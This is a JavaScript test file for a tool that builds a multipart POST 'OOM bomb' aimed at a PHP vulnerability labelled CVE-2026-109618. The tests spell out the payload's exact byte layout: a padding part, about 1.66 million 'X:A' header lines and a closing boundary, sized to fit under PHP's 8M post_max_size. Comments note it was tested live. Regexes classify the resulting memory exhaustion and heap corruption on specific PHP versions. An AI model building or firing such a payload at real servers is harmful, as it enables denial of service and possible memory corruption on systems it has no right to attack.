import { describe, it, expect } from 'vitest';
import {
    buildOomBomb, EXHAUSTION_RE, HEAP_CORRUPT_RE,
} from '../tools/php-src-oct26.js';


describe('CVE-2026-109618 OOM bomb builder (byte-level vs the proven artifact)', () => {
    it('reproduces the proven structure: 1 pad part + N X:A header lines + close', () => {
        const { body, headerLines } = buildOomBomb({ boundary: 'T3MP3ST' });
        const s = body.toString('latin1');
        expect(s.startsWith('--T3MP3ST\r\nContent-Disposition: form-data; name="pad"\r\n')).toBe(true);
        expect(s.endsWith('\r\n\r\nx\r\n--T3MP3ST--\r\n')).toBe(true);
        expect(headerLines).toBeGreaterThan(1_000_000);           // 8.28MB / 5B ≈ 1.66M — matches the prior session's 1,656,738
        expect((s.match(/X:A\r\n/g) || []).length).toBe(headerLines);
        expect(body.length).toBeLessThanOrEqual(8_388_608);        // under the 8M post_max_size ceiling
    });

    it('stays under the 8M post_max_size ceiling while carrying >1.6M header lines (measured 3/3 live on this exact builder output)', () => {
        const { body, headerLines } = buildOomBomb({ boundary: 'T3MP3ST' });
        expect(headerLines).toBeGreaterThan(1_000_000);
        expect(body.length).toBeLessThanOrEqual(8_388_608);
        // structural exactness: length = head + N*5 ('X:A\r\n') + tail
        const head = Buffer.from('--T3MP3ST\r\nContent-Disposition: form-data; name="pad"\r\n').length;
        expect(body.length).toBe(head + headerLines * 5 + Buffer.from('\r\n\r\nx\r\n--T3MP3ST--\r\n').length);
    });

    it('is deterministic — two builds are byte-equal', () => {
        expect(buildOomBomb().body.equals(buildOomBomb().body)).toBe(true);
    });

    it('respects a custom budget', () => {
        const { body, headerLines } = buildOomBomb({ budget: 1000, headerLine: 'X:A\r\n' });
        expect(body.length).toBeLessThanOrEqual(1000);
        expect(headerLines).toBeGreaterThan(0);
    });
});

describe('classification signatures (measured, not invented)', () => {
    it('matches the real exhaustion output captured on php:8.2.34', () => {
        const real = '<br />\n<b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 4096 bytes) in <b>Unknown</b> on line <b>0</b><br />';
        expect(EXHAUSTION_RE.test(real)).toBe(true);
        expect(HEAP_CORRUPT_RE.test(real)).toBe(false);
    });

    it('matches the zend_mm_heap corruption observed on php:8.5.11 (NEW 2026-10-22)', () => {
        expect(HEAP_CORRUPT_RE.test('zend_mm_heap corrupted')).toBe(true);
        expect(EXHAUSTION_RE.test('zend_mm_heap corrupted')).toBe(false);
    });

    it('does not classify a plain page as exhaustion', () => {
        expect(EXHAUSTION_RE.test('consumer page: PHP 8.5.11\nlast: Array')).toBe(false);
    });
});
